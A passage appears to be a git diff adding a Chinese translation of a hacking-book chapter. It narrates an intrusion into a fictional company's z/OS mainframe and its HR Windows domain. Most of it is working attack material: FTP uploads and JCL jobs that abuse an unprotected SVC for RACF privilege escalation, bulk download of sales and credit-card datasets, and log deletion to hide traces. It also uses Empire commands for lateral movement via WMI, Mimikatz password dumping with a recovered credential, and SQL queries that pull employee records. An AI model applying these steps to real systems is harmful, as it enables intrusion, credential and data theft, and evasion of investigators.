@@ -452,12 +452,394 @@ quit
 
 其实并不奇怪，但整个操作确实证实了一件重要的事情：我们可以执行代码并检索其输出！然而，如何定位重要数据是另一个挑战。
 
-@101 page
+大型机可以承载几乎无限量的数据。再加上它们通常运行几十年，这确实让我们很难找到我们要找的文件夹，犹如大海捞针。
+
+考虑到我们所讨论的只是重要的、几乎是关键的数据，因此它很有可能受到严格保护。这意味着必须有一些规则规定：“只有这些帐户才能访问读取/更改此数据”。如果我们集中精力寻找这样的规则，我们就能找到数据。规则比数据少得多，所以这是一个很好的权衡。
+
+z/OS上的访问规则通常由一个安全组件处理：RACF、TOPSecret或ACF2。RACF占据了近70%的市场份额。LISTUSER命令是RACF命令。它成功的事实证明我们是在一个RACF系统上，所以这已经解决了。
+
+RACF规则非常标准，而且相对容易理解（RACF命令示例参阅http://ruifeio.com/2012/02/25/useful-racf-commands-for-administrators/）。我们有三个主要的访问级别：READ、ALTER和UPDATE。ALTER特权允许更改内容和保护资源的规则，而UPDATE只允许更改内容。
+
+要在RACF数据库中搜索包含销售数据集的已定义规则，只需发出以下命令：
+```
+SEARCH FILTER(*.SALES.**)
+```
+
+是一个警告！鉴于我们有限的权限，此命令将失败（或不返回任何内容），除非：
+- FTPSRV帐户拥有规则或规则所涵盖的数据，这是极不可能的。
+- FTPSRV帐户有特殊的（例如root）属性，我们知道它没有。
+
+考虑到第一个条件是最不可能的，那么在大型机上提升权限如何？据报道，这是一台无法攻克的机器，那么这是否有意义呢？
+
+许多人会惊讶地发现，截至2017年，有许多选项可用于大型机上的提权。
+
+让我们逐一探究：
+- 嗅探流量，直到我们找到一个高特权帐户。大多数与大型机的网络通信都是明文的，所以我们只需要执行ARP投毒来获取证书。可能需要一段时间，但有时这是唯一的选择。
+- 在JCL代码和系统脚本中搜索密码。可能会证明是非常有益的。然而，搜索千兆字节文件的行为可能会导致一些CPU峰值，这会引起硬件管理器的注意。大型机客户机是按其CPU消耗量计费的，因此您可以准确地猜测它们非常密切地监视它。
+- 寻找“神奇”的 Supervisor Calls (SVC)。这些是内存中的特殊函数，由管理员（或由软件安装）编码以授予它们临时的高权限。这一切都很好，只要他们得到适当的保护！但事实并非如此。
+- 寻找保护不力的Authorized Program Facilities(APF)。这些是保存内核模块的特殊文件夹。如果我们可以在这些目录中插入一个程序，我们将获得最高的权限。
+
+谢天谢地，我们不需要从头开始编写程序来执行这些检查。
+
+其他人已经为我们承受了重担，所以我们只需在他们的波浪上冲浪。对于中间人攻击，查看SETn3270(参阅https://github.com/zedsec390/defcon23/tree/master/Network%20Tools/SETn3270)。
+
+但是，我们不能在Windows服务器上启动它，因为它需要OpenSSL和其他库。我们可以将Python脚本编译成一个EXE文件并处理好依赖关系，但我们将把它作为最后一个选项。
+
+同时，我们从ayoul3的Github存储库下载ELV.SVC程序(下载链接https://github.com/ayoul3/Privesc/blob/master/ELV.SVC)。它可以寻找SVC函数，这种类型授予无限权限并转储其代码。然后我们可以检查有哪些保护措施（如果有的话）。
+
+有时SVC可能需要在授予授权之前将某个字符串或数字放在注册表中。一旦我们知道了这一点，我们就可以指示ELV.SVC在哪个注册表中定位哪些数据，然后让它做它的工作：创建一个调用SVC的程序，接收完全权限，然后将我们的帐户提升到特殊状态。
+
+需要注意的是，ELV.SVC不是一个JCL文件，而是一个REXX脚本，相当于z/OS上的python。首先，我们需要将其传输到大型机，然后提交执行此脚本的作业：
+```
+(Empire: SalesFTP) > upload /root/ELV.SVC c:\users\sysback\appdata\local\
+(Empire: SalesFTP) > shell ftp -i -s:ftp_svc.txt > result.txt
+```
+```
+open 192.168.1.200
+FTPSRV
+PASS01
+put C:\Users\sysback\AppData\Local\ELV.SVC
+quit
+```
+
+执行此脚本的JCL卡与以前相同。传递给ELV.SVC的“LIST”选项在内存中搜索SVC：
+```
+//FTPSRV1 JOB
+//STEP01 EXEC PGM=IKJEFT01
+//SYSTSIN DD *
+ex 'FTPSRV.ELV.SVC' 'LIST'
+/*
+//SYSIN DD DUMMY
+//SYSTSPRT DD DSN=FTPSRV.OUTPUT2,
+// DISP=(NEW,CATLG),
+// SPACE=(TRK,1)
+```
+
+我们现在准备将此作业推送到JES组件：
+```
+open 192.168.1.200
+FTPSRV
+PASS01
+quote site file=jes
+put C:\Users\sysback\AppData\Local\FTPSRV.JOB2
+quote site file=seq
+get 'FTPSRV.OUTPUT2’ FTPSRV.OUTPUT2.TXT
+quit
+```
+![](chap5/chap5-11.jpg)
+
+似乎有一个SVC -第226号！我不会详细说明程序集代码，因为它远远超出了本书的范围(请参阅一个学习z/OS汇编的好资源http://www.billqualls.com/assembler/)，但相信我，如果我说这个SVC没有执行安全检查。
+
+任何一个能够正确调用SVC 226的人都可以访问z/OS所提供的所有财富……相当可怕，不是吗？
+
+我们再次调整JCL卡以指示ELV.SVC使用编号226的SVC。我们还需要创建一种库“FTPSRV.PDS()”，ELV.SVC可以编译其负载。
+```
+//FTPSRV1 JOB
+//PDS DD DSN=FTPSRV.PDS(NEWMEM),DISP=(NEW,CATLG), 
+// SPACE=(TRK,(1,1,24)),RECFM=U </b> 
+//
+//STEP01 EXEC PGM=IKJEFT01
+//SYSTSIN DD *
+ ex 'FTPSRV.ELV.SVC' 'DSN=FTPSRV.PDS SVC=226'
+/*
+//SYSIN DD DUMMY
+//SYSTSPRT DD DSN=FTPSRV.OUTPUT3,
+// DISP=(NEW,CATLG),
+// SPACE=(TRK,1)
+```
+
+我们通过受信任的FTP服务再次执行作业，然后获取输出文件：
+![](chap5/chap5-12.jpg)
+
+太棒了！一切顺利。我们使用与之前相同的LISTUSER命令检查FTPSRV的权限：
+![](chap5/chap5-13.jpg)
+
+终于拿到SPECIAL权限了！既然我们对RACF拥有适当的权限，我们就可以发布垂涎已久的搜索命令：
+```
+//FTPSRV1 JOB
+//STEP01 EXEC PGM=IKJEFT01
+//SYSTSIN DD *
+ SEARCH FILTER(*.SALES.**)
+/*
+//SYSIN DD DUMMY
+//SYSTSPRT DD DSN=FTPSRV.OUTPUT5,
+// DISP=(NEW,CATLG),
+// SPACE=(TRK,1)
+```
+
+![](chap5/chap5-14.jpg)
 
 
+很漂亮，不是吗？销售数据、信用卡号码、产品等。剩下要做的就是使用熟悉的mget命令下载这些文件。
+```
+open 192.168.1.200
+FTPSRV
+PASS01
+mget SALESMAS.SALES.ACOUNTS.*
+prompt
+mget SALESMAS.SALES.PRODUCTS.*
+prompt
+mget ARCHIVE.SALES.*
+prompt
+quit
+```
+
+在离开主机之前，我们需要删除在磁盘上创建的多个文件。如果没有我们的帮助，调查人员也会有足够的线索。这个简单的JCL将处理这个任务：
+```
+//FTPSRV1 JOB,MSGLEVEL=0
+//STEP01 EXEC PGM=IKJEFT01
+//SYSTSIN DD *
+ DELETE 'FTPSRV.OUTPUT1'
+ DELETE 'FTPSRV.OUTPUT2'
+ DELETE 'FTPSRV.OUTPUT3'
+ DELETE 'FTPSRV.OUTPUT4'
+ DELETE 'FTPSRV.OUTPUT5'
+ DELETE 'FTPSRV.PDS'
+ DELETE 'FTPSRV.ELV.SVC'
+ OUTPUT FTPSRV1(JOB04721) delete
+OUTPUT FTPSRV1(JOB04722) delete
+OUTPUT FTPSRV1(JOB04723) delete
+OUTPUT FTPSRV1(JOB04724) delete
+OUTPUT FTPSRV1(JOB04725) delete
+ ALU FTPSRV NOSPECIAL NOOPERATIONS
+/*
+//SYSIN DD DUMMY
+//SYSTSPRT DD SYSOUT=*
+```
+
+我们在工作卡中添加了MSGLEVEL=0指令，这样就不会记录上次提交的JCL的核心内容。使用多个“OUTPUT”命令删除与先前JCL相关的日志。
+
+最后，我们删除帐户的特殊和操作权限，使一切恢复正常。
+
+还不错吧？大型机被黑客社区如此忽视，以至于我们认为它们已经过时，很快就会消失。
+
+因此，一个典型的渗透测试人员更喜欢电子邮件和域控制器，而真正的数据是在一个（有时）缺乏安全审计审查的大型机的数据集内…
+
+## HR域
+### 再次认识对方
+在上一章中，我们利用了GBSALES和GBSHOP域中列出的备份帐户。这是一个技巧，我们可以再次应用在其他一些域：GBRD，GBCORP等。
+
+然而，人力资源领域GBHR似乎没有这样的帐户。幸运的管理失误，还是真正的加固措施？谁知道呢…无论如何，我们会为这个域寻求一种不同的方法：寻找系统管理员。
+
+我们已经完全控制了不同域中的一些计算机。因此，我们可以将最近连接到这些所有这些机器上的用户的明文密码dump出来，如果有人连接到其中任何一台机器上，就会将它们变成真正的陷阱。
+```
+Empire: salesFTP) > agents
+[*] Active agents:
+Name Internal IP Machine Name Username
+wkAgent 192.168.1.25 WK0025 *WL0025_wk_admin
+DvAgent 192.168.1.2 WK0025 GBSHOP\dvoxon
+Dcshop 10.10.20.199 SV0199 *GBSHOP\rachel_adm
+salesFTP 10.30.30.210 SL0210 *GBSALES\sysback
+```
+
+GBHR用户、计划任务或服务帐户连接到这些陷阱之一并将其凭据留在内存中，这只是时间问题！
+
+使用GBSALES域上的代理，我们首先在GBHR中列出域管理员：
+```
+(Empire: salesFTP) > usemodule
+situational_awareness/network/powerview/get_user
+(Empire: get_user) > set Filter adminCount=1
+(Empire: get_user) > set Domain GBHR.CORP
+(Empire: get_user) > execute
+Job started: Debug32_qa90a
+distinguishedname : CN=Administrator,CN=Users,DC=GBHR,DC=CORP
+name : Administrator
+objectsid : S-1-5-21-1930387874-2808181134-879091260-500
+admincount : 1
+distinguishedname : CN=svc_ps,CN=Users,DC=GBHR,DC=CORP
+name : svc_ps
+objectsid : S-1-5-21-1930387874-2808181134-879091260-2001
+admincount : 1
+distinguishedname : CN=erica_a,CN=Users,DC=GBHR,DC=CORP
+name : erica_a
+objectsid : S-1-5-21-1930387874-2808181134-879091260-2030
+admincount : 1
+```
+
+原理很简单：我们不断地对照不同GBSALES和GBSHOP服务器（超过400台机器）上当前的活跃用户交叉检查这个列表。
+
+假如在机器上找到一个GBHR管理员，我们连接到它，使用Mimikatz dump出明文密码！
+
+如果我们运气不好（有时活动很少），我们会在几个小时后再试一次。毕竟，在某个时间点，人力资源管理帐户将获取GBSHOP或GBHR资源是合乎逻辑的。
+
+为什么不先建立双向信任呢。
+```
+(Empire: salesFTP) > usemodule
+situational_awareness/network/powerview/user_hunter
+(Empire: user_hunter) > execute
+```
+![](chap5/chap5-15.jpg)
+
+在属于GBSALES域的服务器SL0213上似乎有一些有趣的活动。我们通过使用WMI生成远程Empire代理来移动到该服务器：
+```
+(Empire: salesFTP) > usemodule lateral_movement/invoke_wmi
+(Empire: invoke_wmi) > set Listener FrontGun_List
+(Empire: invoke_wmi) > set ComputerName SL0213.GBSALES.CORP
+(Empire: invoke_wmi) > run
+[+] Initial agent BHNS2HZGPF43TDRX from 10.30.30.213 now active
+(Empire: invoke_wmi) > interact BHNS2HZGPF43TDRX
+(Empire: BHNS2HZGPF43TDRX) > rename SL0213
+(Empire: SL0213) >
+```
+
+我们现在要做的就是把Mimikatz释放到目标身上：
+```
+(Empire: SL2013) > mimikatz
+Job started: Debug32_md6ll
+```
+![](chap5/chap5-16.jpg)
+
+第三个域沦陷了：svc_ps/Sheldon*01。
+
+### 寻找数据
+一旦拥有了域管理帐户，我们就可以开始考虑员工数据存储在哪里。我们当然可以通过查找share（share_finder模块）在这里和那里获得一些摘录，但是真正的数据一定保存在结构化数据库中。
+
+我们使用WMI作为横向移动向量在众多HR服务器中的一个服务器上放置代理：
+```
+(Empire: salesFTP) > usemodule lateral_movement/invoke_wmi
+(Empire: invoke_wmi) > set Listener FrontGun_List
+(Empire: invoke_wmi) > set UserName GHBR\svc_ps
+(Empire: invoke_wmi) > set Password Sheldon*01
+(Empire: invoke_wmi) > set ComputerName SR0011.GBHR.CORP
+(Empire: invoke_wmi) > run
+[+] Initial agent VJAKEHA86D9AJDAG from 10.40.40.11 now active
+(Empire: invoke_wmi) > interact VJAKEHA86D9AJDAG
+(Empire: VJAKEHA86D9AJDAG) > rename HRAgent
+(Empire: HRAgent) >
+```
+
+在服务器描述中查找关键字“HR”的简单查询会返回许多前景看好的结果：
+```
+(Empire: HRAgent) > usemodule situational_awareness/network/powerview/
+get_computer
+(Empire: get_computer) > set filter description=*HR*
+(Empire: get_computer) > set FullData True
+(Empire: get_computer) > run
+Logoncount : 441
+Badpasswordtime : 1/1/1601 1:00:00 AM
+Description : Master HR database
+Objectclass : CN=SR0040,CN=Computers,DC=GBHR,DC=CORP
+Lastlogontimestamp : 3/26/2017 5:52:17 PM
+Name : SR0040
+```
+
+最令我们高兴的是，管理员被教导选择有意义的服务器名称和描述文本。他们必须这样做，否则信息系统将难以管理。这使我们的工作更容易。人力资源数据库显然在SR0040.GBHR.CORP上。
+
+由于它托管在Windows服务器上，我们可以大胆地假设数据库运行在Microsoft SQL server上，然后继续直接连接到它。但让我们花几秒钟来确认这个假设。
+
+对常用的SQL端口进行快速端口扫描应该可以做到：Oracle的1521、MySQL的3306和SQL Server的1433（尽管在2008版本之后，端口往往是动态选择的）。
+```
+(Empire: HRAgent) > usemodule situational_awareness/network/portscan
+(Empire: portscan) > use Ports {1433, 1521, 3306}
+(Empire: portscan) > use Hosts SR0040.GBHR.CORP
+(Empire: portscan) > run
+Job started: Debug32_0plza
+Hostname OpenPorts 
+-------- --------- 
+SR0040.GBHR.CORP 1433
+```
+
+很 完美！SQL Server的惊人之处在于它通常链接到Windows域。如果域沦陷，每个Microsoft SQL Server数据库也会沦陷。我们有一个域名管理帐户，所以理论上没有什么是遥不可及的。
+
+但是，有时SQL数据库会限制对几个安全组的访问，因此我们需要成为正确的Active Directory组的一部分,那是一种形式。我们可以将svc_ps添加到任何我们认为必要的组中。
+
+在任何情况下，为了与HR数据库交互，我们将PowerShell模块加载到Empire代理中，使其发出SQL请求。下面的脚本就可以了(参阅https://blog.jourdant.me/post/simple-sql-in-powershell)。
+```
+(Empire: HRAgent) > scriptimport /root/Invoke-SqlCommand.ps1
+script successfully saved in memory
+(Empire: HRAgent) > scriptcmd Invoke-SqlCommand -Server "10.40.40.40"
+-Database "master" -Query "SELECT @@version" 
+(Empire: HRAgent) >
+Job Started: Debug32_aja7w
+RunspaceId: ebe22441-f98b-44f7-9533-4c802821a2c5
+Column1 : Microsoft SQL Server 2008 (RTM) – 10.0.1600.22(X64)
+ Jul 9 2008 14:17:44
+ Copyright (c) 1988-2008 Microsoft Corporation
+ Express Edition (64-bit) on Windows NT 6.2 <X64>
+```
 
 
+有几点值得一提：
+- 脚本Invoke-SqlCommand.ps1由代理加载到内存中。它没有触及远程服务器上的磁盘。
+- 由于我们并不真正了解数据库的布局，因此我们选择了一个默认的访问方式：master。或者我们也可以像其他很多人一样用用tempdb。
+- 我们正在处理一个2008年的SQL服务器。
+- 我们不必提供凭据，因为Windows会自动转发svc_ps的标识。显然，作为域管理员就足以访问数据库。
 
+是时候找点乐趣了！在数据库中要做的第一件事是检查当前用户的权限。SQL查询如下(渗透测试人员Monkey的博客有一组SQL查询，这些查询在渗透中很有用http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)：
+```
+"SELECT is_srvrolemember('sysadmin')"
+```
+![](chap5/chap5-17.jpg)
+
+如所料，我们对系统拥有完全的权限。我们可以使用以下查询列出当前数据库：
+```
+"SELECT name FROM master.dbo.sysdatabases "
+```
+
+由于此请求很可能返回多个列，因此我们需要将输出格式转换为字符串，以便能够通过Empire代理查看它。我们将向Invoke SqlCommand追加以下指令：“| out string”：
+```
+(Empire: HRAgent) > scriptcmd scriptcmd Invoke-SqlCommand -Server
+"10.40.40.40" -Database "master" -Query " SELECT name FROM
+master.dbo.sysdatabases" | out-string
+Job started: Debug32_ie9lg
+name 
+---- 
+master
+tempdb
+model
+msdb
+[…]
+HR_master
+[…]
+```
+
+HR_master似乎是最合理的选择…与其列出它的表格（很容易就有几千个）并手动浏览每一个表格，我们只需搜索包含关键字的表格：设计师、员工、工资等，就可以解决大海捞针的问题:
+```
+select table_name from hr_master.information_schema.tables where
+table_type = 'base table' and table_name like '%employee%'
+```
+
+```
+(Empire: HRAgent) > scriptcmd scriptcmd Invoke-SqlCommand -Server
+"10.40.40.40" -Database "master" -Query SELECT TABLE_NAME FROM
+HR_master.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE
+TABLE'" | out-string
+
+Job started: Debug32_azd0k
+table_name 
+---- 
+HR_Employee_DE_Full
+HR_Employee_wages_ref
+HR_Employee_raise
+HR_Employee_eval
+HR_Employee_perf
+[…]
+```
+
+头奖！我们现在可以享受浏览这些表格，查找我们喜欢的任何数据：设计师、工资、绩效评估等(在转储整个表之前，最好先获取要转储的相关和感兴趣的列的名称)。
+```
+select * from hr_master..Employee_GB_Full
+```
+
+```
+(Empire: HRAgent) > scriptcmd scriptcmd Invoke-SqlCommand -Server
+"10.40.40.40" -Database "master" -Query select * from
+hr_master..Employee_GB_Full" | out-string
+Job started: Debug32_azd0k
+empno : 166
+ename : SCHMIDT
+job : DESIGNER
+mgr : 6
+hiredate : 12/17/2016 12/:00:00 AM
+````
+
+要将数据输出到文件中，我们只需添加PowerShell命令：| output file-append c:\users\svc_ps\appdata\local\out.txt
+
+我们将后续章节中注意安全提取。
+
+
+### 董事会会议
+@116 page
 
 
 
